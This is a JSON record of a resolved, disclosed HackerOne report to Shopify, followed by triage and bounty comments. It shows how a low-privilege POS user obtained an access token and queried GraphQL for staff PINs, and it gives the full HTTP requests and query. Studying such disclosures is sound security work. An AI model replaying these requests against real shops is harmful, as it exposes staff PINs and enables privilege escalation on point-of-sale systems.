{"id":1091303,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDkxMzAz","url":"https://hackerone.com/reports/1091303","title":"[h1-2102] [Yaworski's Broskis] Low privilege user can read POS PINs via graphql and elevate his privilege","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2021-01-31T16:38:23.607Z","submitted_at":"2021-01-31T16:38:23.682Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ramsexy","url":"/ramsexy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/075/704/f83ab3bbb51294b11bd1f58eb00a5259155baa1d_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":true,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-04-08T19:33:15.917Z","bug_reporter_agreed_on_going_public_at":"2021-04-08T19:33:15.831Z","team_member_agreed_on_going_public_at":"2021-04-08T18:53:30.332Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nA low privilege user (both in the shop and in the POS) can read POS PINs via graphql and elevate his privilege with a physical access to the POS.\n\n## Steps To Reproduce:\n1. Log in to your shop and install the POS app https://apps.shopify.com/shopify-pos\n2. Log in Shopify Plus as an org owner and create a user with the minimal privilege requirements\n\n    {F1178771}\n2. Go to the newly created user POS staff page (https://h1-2102-ramsexy.myshopify.com/admin/apps/pos/staff/61357948984) and check \"Give Point of Sale access\" and select Associate role.\n\n    {F1178781}\n3. Go back to the user permission page in Shopify Plus, and remove all permission from the newly created user. Please notice the following message about POS. \n    {F1178787}\n4. As the low priv user, request a POS `access_token` :\n\n    Request :\n\n    ```http\nPOST /admin/api/xauth HTTP/1.1\nAccept: application/json\nContent-Type: application/json; charset=UTF-8\nContent-Length: 137\nHost: h1-2102-ramsexy.myshopify.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/4.0.0\n\n    {\"api_key\":\"a53cf2ce9b5dabf5dd222b3615c29569\",\"login\":\"ramsexy+h1-2102-3@wearehackerone.com\",\"password\":\"███\"}\n``` \n\n    Response :\n\n    ```json\n{\n    \"access_token\": \"█████\",\n    \"impersonated_by_employee\": false,\n    \"scope\": \"read_analytics,write_checkouts,write_customers,write_draft_orders,write_fulfillments,read_gdpr_data_request,write_gift_cards,write_inventory,write_marketing_events,write_orders,write_price_rules,write_product_listings,write_products,write_reports,write_resource_feedbacks,write_script_tags,write_shipping,read_shopify_payments_bank_accounts,read_shopify_payments_disputes,read_shopify_payments_payouts,read_all_orders,write_apps,write_channels,read_disputes,write_home,write_locations,write_notifications,write_payment_gateways,read_payment_settings,write_publications,read_shopify_payments,write_users,write_order_edits,write_point_of_sale_devices,write_retail_roles,write_merchant_managed_fulfillment_orders,write_third_party_fulfillment_orders,write_cash_tracking,write_physical_receipts,write_discounts,write_smart_grid,write_images,write_retail_bbpos_merchant,write_retail_addon_subscriptions,read_checkout_settings,write_stripe_terminal_readers,read_all_subscription_contracts,read_product_recommendations,write_retail_user_data,write_pos_channel.access,write_pos_compliance.access\",\n    \"associated_user_scope\": \"write_checkouts,write_product_listings,write_resource_feedbacks,read_shopify_payments_disputes,read_shopify_payments_payouts,write_point_of_sale_devices,write_cash_tracking,write_physical_receipts,write_retail_bbpos_merchant,write_stripe_terminal_readers,write_pos_channel.access,write_pos_compliance.access,read_locations,read_users,read_retail_roles,read_smart_grid,read_retail_addon_subscriptions,read_retail_user_data\",\n    \"session\": null,\n    \"account_number\": null,\n    \"associated_user\": {\n        \"id\": 61357948984,\n        \"first_name\": \"das\",\n        \"last_name\": \"das\",\n        \"email\": \"ramsexy+h1-2102-3@wearehackerone.com\",\n        \"account_owner\": false,\n        \"locale\": \"en\",\n        \"collaborator\": false,\n        \"email_verified\": true\n}\n```\n    * The `api_key` can be found in the page at https://h1-2102-ramsexy.myshopify.com/admin/apps/pos.\n    * The `login` and `password` are your low privilege user credentials\n\n5. Using this `access_token` in the `X-Shopify-Access-Token` header, you can query the graphql endpoint to retrieve the POS staff information, including PINs:\n\n    Request:\n    ```http\nPOST /admin/api/unversioned/graphql HTTP/1.1\nHost: h1-2102-ramsexy.myshopify.com\nContent-Type: application/json\nConnection: close\nX-Shopify-Override-User-Locale: en-US\nX-Shopify-Access-Token: ███\nAccept: application/json\nUser-Agent: Shopify POS/iOS/6.28.0 (iPhone8,4/com.jadedpixel.pos/14.2.0) - Build 855\nContent-Length: 1002\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\n\n    {\"query\":\"fragment RemoteStaffMember on StaffMember { __typename active email name firstName lastName phone pin id isShopOwner accountType permissions { __typename userPermissions } privateData { __typename updatedAt identityOwned identityUuid } retailData(location: $locationID) { __typename canInitializePos posAccess retailRole { __typename ... RemoteRetailRole } } } fragment RemoteRetailRole on RetailRole { __typename id name isDefault: default hidden updatedAt retailRolePermissions { __typename ... RemoteRetailRolePermission } } fragment RemoteRetailRolePermission on RetailRolePermission { __typename access retailPermissionTag } query StaffList($first: Int, $after: String, $query: String, $locationID: ID) { __typename shop { __typename staffMembers(first: $first, after: $after, query: $query) { __typename edges { __typename node { __typename ... RemoteStaffMember } cursor } pageInfo { __typename hasNextPage } } } }\",\"variables\":{\"first\":100,\"query\":\"updated_at:\u003e1970-01-01T00:00:00Z\"}}\n```\n\n    Response:\n\n    ```json\n[...]\n    \"__typename\": \"StaffMember\",\n    \"active\": true,\n    \"email\": \"ramsexy+h1-2102@wearehackerone.com\",\n    \"name\": \"Ram Sexy\",\n    \"firstName\": \"Ram\",\n    \"lastName\": \"Sexy\",\n    \"phone\": null,\n    \"pin\": \"3333\",\n    \"id\": \"gid:\\/\\/shopify\\/StaffMember\\/61340352568\",\n    \"isShopOwner\": true\n[...]\n```\n\n6. Using that information, the low privilege user can use the Manager PIN while using the POS device, which allow him to perform various actions he should not be able to do.\n\n## Impact\n\nA low privilege user (both in the shop and in the POS) who should only be able to log into the POS with limited privilege using his PIN can retrieve Manager PIN to elevate his privilege.","bounty_amount":"5300.0","formatted_bounty":"$5,300","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1178771,"file_name":"Screen_Shot_2021-01-31_at_10.54.02_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y7kj6n62knij8x829hlb68h4vj30?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2021-01-31_at_10.54.02_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2021-01-31_at_10.54.02_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZQXPADTK%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132358Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIEnMr4DVhYYTqMb%2BOP2PKHfYpSv9D5BBEJnMqEhFTzeKAiAeXkKMs80U9YQDe4ttV6IqDuQKfy6G4rgQ5lLDs%2FynrSqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMbhflm22iYJYqUsxzKtcDB8Pgwi96hJiplV7WKaw0AR0k%2BEXDFBW%2BG%2BYdpHb62oEWGe8HSRbQaU3Q3Fj%2BSvKqS093fZuQDsCdV4M3iqQIqCtv1Q6GPf9rTsY3aeauyx8etG%2BURaJibQVQc9PwZaDx1L%2BryPnwfQFfT9ayiFdqA9fZYBYVBAdVfr6WiMFuX0XdRnwM7tzE6J0AXxB37N69wBbU2Xb3tKIicAQDLneqa8aoUR3YUFtvOFZAz2Qc931NT%2Br%2FigpMQjz0syuVR2poADAistQGXHWk3I6xFISQymYX7MTDVeyWJZRkAoG5czInm6nDg9jipQu%2BenzxOmQOqUNZ%2FDC76AwjY5aAAvtd6r6JT2V72trR11DROBIsJO%2FIShH7q9JoESyB%2F1o6Q5%2BiuwomCPFU4tVEemlEc5lNYIZamrFJsAH5GaSMDFA6YpipFDWfpviI7f2MiBQlxPJAB5X1QzT5WIXx2PazxnrBI3G29KeYynTTVHHJidcczfgLkVHwxGbuhtijOBi4s%2Fgk0dWW44Ywe3A1G%2BRX8Yj0NVuvt8Pt%2B0N5CI3EdAFGY1U6SFNz7egYzaePbVDnsQZghACy4h1g%2BARgHKr4cJvS8EZ5xhXkVVfycQcZfNVbW3SIBSo%2B4HEJMLbjkIsGOqYB2jUwpV9YeKKeYEkCjUFt285lWr0XRj6ae48f32wMeam4CFHiyCcH0MCoNenFvDHFJCBn4H%2B3DfwYTcQjZpttvBz8T5sl3abGg2MBvdgbzRrwVgocNPq%2FJOcEyipSDakoglRRfC5s4w5bFejabZEOQFOdoE5KginzyfxwFFH009lEzVJiGfKTDbqdNnetBVWk6JyUphW6lwfF1hGZK9Z27qAkF0weOw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=34a3191019989d35bc49fa3ccf264695b3f9d08877294b3ae7d7e7aec2648d57","file_size":204501,"type":"image/png"},{"id":1178781,"file_name":"Screen_Shot_2021-01-31_at_11.01.06_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j2oyg7b21199ul1pr74tn4aellzs?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2021-01-31_at_11.01.06_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2021-01-31_at_11.01.06_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZQXPADTK%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132358Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIEnMr4DVhYYTqMb%2BOP2PKHfYpSv9D5BBEJnMqEhFTzeKAiAeXkKMs80U9YQDe4ttV6IqDuQKfy6G4rgQ5lLDs%2FynrSqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMbhflm22iYJYqUsxzKtcDB8Pgwi96hJiplV7WKaw0AR0k%2BEXDFBW%2BG%2BYdpHb62oEWGe8HSRbQaU3Q3Fj%2BSvKqS093fZuQDsCdV4M3iqQIqCtv1Q6GPf9rTsY3aeauyx8etG%2BURaJibQVQc9PwZaDx1L%2BryPnwfQFfT9ayiFdqA9fZYBYVBAdVfr6WiMFuX0XdRnwM7tzE6J0AXxB37N69wBbU2Xb3tKIicAQDLneqa8aoUR3YUFtvOFZAz2Qc931NT%2Br%2FigpMQjz0syuVR2poADAistQGXHWk3I6xFISQymYX7MTDVeyWJZRkAoG5czInm6nDg9jipQu%2BenzxOmQOqUNZ%2FDC76AwjY5aAAvtd6r6JT2V72trR11DROBIsJO%2FIShH7q9JoESyB%2F1o6Q5%2BiuwomCPFU4tVEemlEc5lNYIZamrFJsAH5GaSMDFA6YpipFDWfpviI7f2MiBQlxPJAB5X1QzT5WIXx2PazxnrBI3G29KeYynTTVHHJidcczfgLkVHwxGbuhtijOBi4s%2Fgk0dWW44Ywe3A1G%2BRX8Yj0NVuvt8Pt%2B0N5CI3EdAFGY1U6SFNz7egYzaePbVDnsQZghACy4h1g%2BARgHKr4cJvS8EZ5xhXkVVfycQcZfNVbW3SIBSo%2B4HEJMLbjkIsGOqYB2jUwpV9YeKKeYEkCjUFt285lWr0XRj6ae48f32wMeam4CFHiyCcH0MCoNenFvDHFJCBn4H%2B3DfwYTcQjZpttvBz8T5sl3abGg2MBvdgbzRrwVgocNPq%2FJOcEyipSDakoglRRfC5s4w5bFejabZEOQFOdoE5KginzyfxwFFH009lEzVJiGfKTDbqdNnetBVWk6JyUphW6lwfF1hGZK9Z27qAkF0weOw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=456c5628d3d4755af43d7d257c554bab29a1210db4bdbc6b483d20512af4763a","file_size":264529,"type":"image/png"},{"id":1178787,"file_name":"Screen_Shot_2021-01-31_at_11.06.15_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/saevi2abx0gx5tz35ry84yoivvxl?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2021-01-31_at_11.06.15_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2021-01-31_at_11.06.15_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZQXPADTK%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132358Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIEnMr4DVhYYTqMb%2BOP2PKHfYpSv9D5BBEJnMqEhFTzeKAiAeXkKMs80U9YQDe4ttV6IqDuQKfy6G4rgQ5lLDs%2FynrSqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMbhflm22iYJYqUsxzKtcDB8Pgwi96hJiplV7WKaw0AR0k%2BEXDFBW%2BG%2BYdpHb62oEWGe8HSRbQaU3Q3Fj%2BSvKqS093fZuQDsCdV4M3iqQIqCtv1Q6GPf9rTsY3aeauyx8etG%2BURaJibQVQc9PwZaDx1L%2BryPnwfQFfT9ayiFdqA9fZYBYVBAdVfr6WiMFuX0XdRnwM7tzE6J0AXxB37N69wBbU2Xb3tKIicAQDLneqa8aoUR3YUFtvOFZAz2Qc931NT%2Br%2FigpMQjz0syuVR2poADAistQGXHWk3I6xFISQymYX7MTDVeyWJZRkAoG5czInm6nDg9jipQu%2BenzxOmQOqUNZ%2FDC76AwjY5aAAvtd6r6JT2V72trR11DROBIsJO%2FIShH7q9JoESyB%2F1o6Q5%2BiuwomCPFU4tVEemlEc5lNYIZamrFJsAH5GaSMDFA6YpipFDWfpviI7f2MiBQlxPJAB5X1QzT5WIXx2PazxnrBI3G29KeYynTTVHHJidcczfgLkVHwxGbuhtijOBi4s%2Fgk0dWW44Ywe3A1G%2BRX8Yj0NVuvt8Pt%2B0N5CI3EdAFGY1U6SFNz7egYzaePbVDnsQZghACy4h1g%2BARgHKr4cJvS8EZ5xhXkVVfycQcZfNVbW3SIBSo%2B4HEJMLbjkIsGOqYB2jUwpV9YeKKeYEkCjUFt285lWr0XRj6ae48f32wMeam4CFHiyCcH0MCoNenFvDHFJCBn4H%2B3DfwYTcQjZpttvBz8T5sl3abGg2MBvdgbzRrwVgocNPq%2FJOcEyipSDakoglRRfC5s4w5bFejabZEOQFOdoE5KginzyfxwFFH009lEzVJiGfKTDbqdNnetBVWk6JyUphW6lwfF1hGZK9Z27qAkF0weOw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5035323954cfb4856be33ae92a5c8861e084d495e7c3cce7d1e8afb4f3475963","file_size":67070,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":36,"voters":["rootz491","battle_angel","m0chan","drsniper","the_arch_angel","ramsexy","th4nu_0x0","ali","ayoub0x1","sudi","and 26 more..."],"severity":{"rating":"medium","score":5.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10531609,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"automated_response":false,"created_at":"2021-01-31T16:38:32.628Z","updated_at":"2021-01-31T16:38:32.628Z","actor":{"username":"ramsexy","cleared":true,"url":"/ramsexy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/075/704/f83ab3bbb51294b11bd1f58eb00a5259155baa1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"email":"smsecurity","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10531610,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"automated_response":false,"created_at":"2021-01-31T16:38:37.995Z","updated_at":"2021-01-31T16:38:37.995Z","actor":{"username":"ramsexy","cleared":true,"url":"/ramsexy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/075/704/f83ab3bbb51294b11bd1f58eb00a5259155baa1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"email":"the_arch_angel","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10531611,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"automated_response":false,"created_at":"2021-01-31T16:38:41.927Z","updated_at":"2021-01-31T16:38:41.927Z","actor":{"username":"ramsexy","cleared":true,"url":"/ramsexy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/075/704/f83ab3bbb51294b11bd1f58eb00a5259155baa1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"email":"c0rv4x","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10531612,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","automated_response":false,"created_at":"2021-01-31T16:38:59.524Z","updated_at":"2021-01-31T16:38:59.524Z","actor":{"username":"c0rv4x","cleared":true,"url":"/c0rv4x","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/428/505/fd2c62b6a15f3f1505ea838e56bf5c595c826dff_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10531666,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","automated_response":false,"created_at":"2021-01-31T16:54:13.567Z","updated_at":"2021-01-31T16:54:13.567Z","actor":{"username":"the_arch_angel","cleared":true,"url":"/the_arch_angel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QWfPdadPrZC1WegBviatzUVW/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10531712,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","automated_response":false,"created_at":"2021-01-31T17:12:19.567Z","updated_at":"2021-01-31T17:12:19.567Z","actor":{"username":"smsecurity","cleared":true,"url":"/smsecurity","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/059/978c19d6325d19a4c935d9be59b7db1842950767_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10536584,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @ramsexy and thanks for your report,\n\nI've tried 3 times to reach the same functionalities described here, but I am not able to do it. I am stuck at step 3-4. As such, can you please either share a video or maybe show it on a live call?\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2021-02-01T10:30:28.643Z","updated_at":"2021-02-01T10:30:57.063Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10538744,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I just did a live demo with @turtle_shell. Back to New!","automated_response":false,"created_at":"2021-02-01T13:19:45.047Z","updated_at":"2021-02-01T13:19:45.047Z","actor":{"username":"ramsexy","cleared":true,"url":"/ramsexy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/075/704/f83ab3bbb51294b11bd1f58eb00a5259155baa1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10538785,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @ramsexy,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@turtle_shell","automated_response":false,"created_at":"2021-02-01T13:24:25.243Z","updated_at":"2021-02-01T13:24:25.243Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10538909,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2021-02-01T13:30:04.517Z","updated_at":"2021-02-01T13:30:04.517Z","additional_data":{"added_weaknesses":[{"id":18,"name":"Information Disclosure"}],"removed_weaknesses":[]},"actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10538911,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2021-02-01T13:30:05.066Z","updated_at":"2021-02-01T13:30:05.066Z","additional_data":{"old_severity":"High (7.1)","new_severity":"Medium (6.5)","old_severity_id":972052,"new_severity_id":972940},"actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555299,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ramsexy,\n\nThanks again for your report! \n\nWe're awarding a $1600 bounty for this issue. Please find below our rationale generated using our [CVSS calculator](https://shopify.github.io/appsec/cvss_calculator/). While this allows you to sign into a POS terminal as another POS user, the impact is limited as you do not get control of their personal access token. For that reason we have set confidentiality and integrity to low. Great find! \n\n## Base Score CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N 5.4\n## Environment: Non-Core (Modified by CR:L/IR:L/AR:L) 4.2\n\n#### Attack Complexity: L\n* Specific conditions or measurable effort to exploit?: No\n\n#### Privileges Required: L\n* Requires privileged account (not self-registered)?: Yes\n* Does the attacker need extensive permissions?: No\n\n#### User Interaction: N\n* Requires victim to perform some action during exploit?: No\n\n#### Scope: U\n* Can the attacker impact a separate service?: No\n\n#### Confidentiality: L\n* How much data could be accessed?: Some\n* How much of Shopify is impacted?: Most or All\n\n#### Integrity: L\n* How much data could be changed?: Some\n* How much of Shopify is impacted?: Most or All\n\n#### Availability: N\n* Level of disruption to network service?: None\n","automated_response":false,"created_at":"2021-02-02T20:26:18.592Z","updated_at":"2021-02-02T20:26:18.592Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555302,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your report, keep up the great work!","automated_response":true,"created_at":"2021-02-02T20:26:23.264Z","updated_at":"2021-02-02T20:26:23.264Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"smsecurity","url":"/smsecurity"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555303,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your report, keep up the great work!","automated_response":true,"created_at":"2021-02-02T20:26:23.512Z","updated_at":"2021-02-02T20:26:23.512Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"the_arch_angel","url":"/the_arch_angel"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555304,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your report, keep up the great work!","automated_response":true,"created_at":"2021-02-02T20:26:23.702Z","updated_at":"2021-02-02T20:26:23.702Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"c0rv4x","url":"/c0rv4x"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555305,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your report, keep up the great work!","automated_response":true,"created_at":"2021-02-02T20:26:23.897Z","updated_at":"2021-02-02T20:26:23.897Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"ramsexy","url":"/ramsexy"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555320,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2021-02-02T20:27:22.251Z","updated_at":"2021-02-02T20:27:22.251Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"your-store.myshopify.com","new_scope":"Shopify Developed 